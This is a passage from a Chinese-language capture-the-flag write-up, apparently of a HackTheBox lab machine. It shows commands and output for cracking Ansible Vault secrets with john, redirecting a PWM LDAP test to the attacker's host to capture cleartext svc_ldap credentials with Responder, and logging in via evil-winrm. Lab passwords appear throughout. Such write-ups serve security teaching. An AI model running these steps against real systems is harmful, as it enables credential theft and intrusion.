+</span></span><span style="display:flex;"><span>        │   │   ├── generate_ca_certs.yml
+</span></span><span style="display:flex;"><span>        │   │   ├── init_ca.yml
+</span></span><span style="display:flex;"><span>        │   │   ├── main.yml
+</span></span><span style="display:flex;"><span>        │   │   └── requests.yml
+</span></span><span style="display:flex;"><span>        │   ├── templates
+</span></span><span style="display:flex;"><span>        │   │   ├── extensions.cnf.j2
+</span></span><span style="display:flex;"><span>        │   │   └── openssl.cnf.j2
+</span></span><span style="display:flex;"><span>        │   ├── tox.ini
+</span></span><span style="display:flex;"><span>        │   └── vars
+</span></span><span style="display:flex;"><span>        │       └── main.yml
+</span></span><span style="display:flex;"><span>        ├── LDAP
+</span></span><span style="display:flex;"><span>        │   ├── defaults
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── files
+</span></span><span style="display:flex;"><span>        │   │   └── pam_mkhomedir
+</span></span><span style="display:flex;"><span>        │   ├── handlers
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── meta
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── README.md
+</span></span><span style="display:flex;"><span>        │   ├── tasks
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── templates
+</span></span><span style="display:flex;"><span>        │   │   ├── ldap_sudo_groups.j2
+</span></span><span style="display:flex;"><span>        │   │   ├── ldap_sudo_users.j2
+</span></span><span style="display:flex;"><span>        │   │   ├── sssd.conf.j2
+</span></span><span style="display:flex;"><span>        │   │   └── sudo_group.j2
+</span></span><span style="display:flex;"><span>        │   ├── TODO.md
+</span></span><span style="display:flex;"><span>        │   ├── Vagrantfile
+</span></span><span style="display:flex;"><span>        │   └── vars
+</span></span><span style="display:flex;"><span>        │       ├── debian.yml
+</span></span><span style="display:flex;"><span>        │       ├── main.yml
+</span></span><span style="display:flex;"><span>        │       ├── redhat.yml
+</span></span><span style="display:flex;"><span>        │       └── ubuntu-14.04.yml
+</span></span><span style="display:flex;"><span>        ├── PWM
+</span></span><span style="display:flex;"><span>        │   ├── ansible.cfg
+</span></span><span style="display:flex;"><span>        │   ├── ansible_inventory
+</span></span><span style="display:flex;"><span>        │   ├── defaults
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── handlers
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── meta
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── README.md
+</span></span><span style="display:flex;"><span>        │   ├── tasks
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   └── templates
+</span></span><span style="display:flex;"><span>        │       ├── context.xml.j2
+</span></span><span style="display:flex;"><span>        │       └── tomcat-users.xml.j2
+</span></span><span style="display:flex;"><span>        └── SHARE
+</span></span><span style="display:flex;"><span>            └── tasks
+</span></span><span style="display:flex;"><span>                └── main.yml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">27</span> directories, <span style="color:#ae81ff">46</span> files
+</span></span></code></pre></div><p>先看 <code>PWM/templates/tomcat-users.xml.j2</code> 模板，robot 的密码暴露出来了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Automation/Ansible/PWM/templates/tomcat-users.xml.j2
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.0&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cp1252&#39;</span>?&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;tomcat-users xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://tomcat.apache.org/xml&#34;</span> xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span> xsi:schemaLocation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
+</span></span><span style="display:flex;"><span> version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;T0mc@tAdm1n&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-gui&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>&lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robot&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;T0mc@tR00t&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-script&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/tomcat-users&gt;
+</span></span></code></pre></div><p><code>cat Automation/Ansible/PWM/defaults/main.yml</code> 中包含着三个 Ansible Vault 加密块，PWN 的登录名、密码、LDAP 都在其中。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Automation/Ansible/PWM/defaults/main.yml
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>pwm_run_dir: <span style="color:#e6db74">&#34;{{ lookup(&#39;env&#39;, &#39;PWD&#39;) }}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwm_hostname: authority.htb.corp
+</span></span><span style="display:flex;"><span>pwm_http_port: <span style="color:#e6db74">&#34;{{ http_port }}&#34;</span>
+</span></span><span style="display:flex;"><span>pwm_https_port: <span style="color:#e6db74">&#34;{{ https_port }}&#34;</span>
+</span></span><span style="display:flex;"><span>pwm_https_enable: true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwm_require_ssl: false
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwm_admin_login: !vault |
+</span></span><span style="display:flex;"><span>          $ANSIBLE_VAULT;1.1;AES256
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
+</span></span><span style="display:flex;"><span>          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
+</span></span><span style="display:flex;"><span>          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">3438</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwm_admin_password: !vault |
+</span></span><span style="display:flex;"><span>          $ANSIBLE_VAULT;1.1;AES256
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
+</span></span><span style="display:flex;"><span>          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
+</span></span><span style="display:flex;"><span>          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">6531</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ldap_uri: ldap://127.0.0.1/
+</span></span><span style="display:flex;"><span>ldap_base_dn: <span style="color:#e6db74">&#34;DC=authority,DC=htb&#34;</span>
+</span></span><span style="display:flex;"><span>ldap_admin_password: !vault |
+</span></span><span style="display:flex;"><span>          $ANSIBLE_VAULT;1.1;AES256
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
+</span></span><span style="display:flex;"><span>          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
+</span></span><span style="display:flex;"><span>          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">3764</span>                                                                                                                                                                      
+</span></span></code></pre></div><p>保存下来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat *
+</span></span><span style="display:flex;"><span>cat: Automation: Is a directory
+</span></span><span style="display:flex;"><span>$ANSIBLE_VAULT;1.1;AES256
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
+</span></span><span style="display:flex;"><span>3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
+</span></span><span style="display:flex;"><span>3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+</span></span><span style="display:flex;"><span>$ANSIBLE_VAULT;1.1;AES256
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
+</span></span><span style="display:flex;"><span>6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
+</span></span><span style="display:flex;"><span>6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3438</span>
+</span></span><span style="display:flex;"><span>$ANSIBLE_VAULT;1.1;AES256
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
+</span></span><span style="display:flex;"><span>3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
+</span></span><span style="display:flex;"><span>3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6531</span>
+</span></span></code></pre></div><p>分别用 ansible2john 保存成 john 能破解的格式。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ /usr/share/john/ansible2john.py ldap_admin_password.vault &gt; ldap.vault.john
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat ldap.vault.john
+</span></span><span style="display:flex;"><span>ldap_admin_password.vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ /usr/share/john/ansible2john.py pwm_admin_login.vault &gt; admin.vault.john
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ /usr/share/john/ansible2john.py pwm_admin_password.vault &gt; admin_pass.vault.john
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat admin*
+</span></span><span style="display:flex;"><span>pwm_admin_password.vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+</span></span><span style="display:flex;"><span>pwm_admin_login.vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+</span></span></code></pre></div><p>用 john 破解得到两个密钥 <code>!@#$%^&amp;*</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt *.vault.john
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">3</span> password hashes with <span style="color:#ae81ff">3</span> different salts <span style="color:#f92672">(</span>ansible, Ansible Vault <span style="color:#f92672">[</span>PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">10000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>!@#$%^&amp;*         <span style="color:#f92672">(</span>pwm_admin_password.vault<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>!@#$%^&amp;*         <span style="color:#f92672">(</span>pwm_admin_login.vault<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>2g 0:00:28:23 96.66% <span style="color:#f92672">(</span>ETA: 03:35:17<span style="color:#f92672">)</span> 0.001173g/s 8150p/s 8197c/s 8197C/s 0799900014..0799623120
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session aborted
+</span></span></code></pre></div><p>用它解开 <code>pwm_admin_password.vault</code> 得到密码 <code>pWm_@dm!N_!23</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat pw.txt
+</span></span><span style="display:flex;"><span>!@#$%^&amp;*
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ansible-vault view --vault-password-file pw.txt SMB/pwm_admin_password.vault
+</span></span><span style="display:flex;"><span>pWm_@dm!N_!23
+</span></span></code></pre></div><p>用密码登录 Web。</p>
+<p><img src="Pasted%20image%2020261102172703.png" alt=""></p>
+<p>修改 LDAP URLs 的地址为 Kali 地址。</p>
+<p><img src="Pasted%20image%2020261102173109.png" alt=""></p>
+<p>点击 Test LDAP Profile。</p>
+<p><img src="Pasted%20image%2020261102173321.png" alt=""></p>
+<p>本地启动 responder 监听，抓取到 svc_ldap 的口令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo responder -I tun0 -v
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Tips jar:
+</span></span><span style="display:flex;"><span>    USDT -&gt; 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+</span></span><span style="display:flex;"><span>    BTC  -&gt; bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    NBT-NS                     <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MDNS                       <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS                        <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DHCP                       <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DHCPv6                     <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    HTTPS server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WPAD proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Auth proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMB server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Kerberos server            <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SQL server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    FTP server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    IMAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    POP3 server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    LDAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MQTT server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    RDP server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DCE-RPC server             <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WinRM server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SNMP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Options:
+</span></span><span style="display:flex;"><span>    Always serving EXE         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Serving EXE                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Serving HTML               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Upstream Proxy             <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoning Options:
+</span></span><span style="display:flex;"><span>    Analyze Mode               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force WPAD auth            <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force Basic Auth           <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force LM downgrade         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force ESS downgrade        <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC              <span style="color:#f92672">[</span>tun0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder IP               <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder IPv6             <span style="color:#f92672">[</span>fe80::f886:936:2983:b9d3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Challenge set              <span style="color:#f92672">[</span>random<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Don<span style="color:#e6db74">&#39;t Respond To Names     [&#39;</span>ISATAP<span style="color:#e6db74">&#39;, &#39;</span>ISATAP.LOCAL<span style="color:#e6db74">&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Don&#39;</span>t Respond To MDNS TLD  <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;_DOSVC&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    TTL <span style="color:#66d9ef">for</span> poisoned response  <span style="color:#f92672">[</span>default<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Current Session Variables:
+</span></span><span style="display:flex;"><span>    Responder Machine Name     <span style="color:#f92672">[</span>WIN-FWLS5RV42FL<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder Domain Name      <span style="color:#f92672">[</span>IELK.LOCAL<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     <span style="color:#f92672">[</span>45947<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Version: Responder 3.2.2.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LDAP<span style="color:#f92672">]</span> Cleartext Client   : 10.129.229.56
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LDAP<span style="color:#f92672">]</span> Cleartext Username : CN<span style="color:#f92672">=</span>svc_ldap,OU<span style="color:#f92672">=</span>Service Accounts,OU<span style="color:#f92672">=</span>CORP,DC<span style="color:#f92672">=</span>authority,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LDAP<span style="color:#f92672">]</span> Cleartext Password : lDaP_1n_th3_cle4r!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LDAP<span style="color:#f92672">]</span> Cleartext Client   : 10.129.229.56
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LDAP<span style="color:#f92672">]</span> Cleartext Username : CN<span style="color:#f92672">=</span>svc_ldap,OU<span style="color:#f92672">=</span>Service Accounts,OU<span style="color:#f92672">=</span>CORP,DC<span style="color:#f92672">=</span>authority,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LDAP<span style="color:#f92672">]</span> Cleartext Password : lDaP_1n_th3_cle4r!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exiting...
+</span></span></code></pre></div><p>用 evil-winrm 登录得到 svc_ldap。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.229.56 -u svc_ldap -p <span style="color:#e6db74">&#39;lDaP_1n_th3_cle4r!&#39;</span>          
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_ldap<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>htb<span style="color:#ae81ff">\s</span>vc_ldap
+</span></span></code></pre></div><h2 id="提权">提权</h2>
+<p>用 certipy-ad 进行 ADCS 枚举。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad find -u <span style="color:#e6db74">&#39;svc_ldap&#39;</span> -p <span style="color:#e6db74">&#39;lDaP_1n_th3_cle4r!&#39;</span> -dc-ip 10.129.229.56 -vulnerable -stdout
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
